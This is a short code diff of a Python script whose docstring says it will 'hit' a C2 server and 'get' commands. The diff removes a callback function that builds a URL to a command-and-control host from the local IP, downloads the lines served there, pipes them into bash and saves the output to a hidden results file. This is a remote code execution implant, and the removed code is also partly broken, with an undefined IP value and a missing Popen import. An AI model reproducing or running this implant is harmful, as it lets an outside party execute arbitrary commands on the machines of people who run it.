@@ -1,27 +1,6 @@
 """
 Hit dat C2, get dem commands
 """
-
-def get_ip():
-    # Get the preffered IP of the local machine
-    
-    return ip
-
-def callback(ip, server):
-    cb_url = "http://" + server + "/" + ip + "/enderman"
-    try:
-        import urllib.request as urllib
-    except:
-        import urllib
-    code = urllib.urlopen(cb_url).readlines()
-    out = open(".results","w")
-    p = Popen("bash", stdin=PIPE, stdout=out, stderr=out)
-    for line in code:
-        p.stdin.write(line)
-    p.communicate()
-    out.close()
-
-
 def main():
     import socket
     import sys
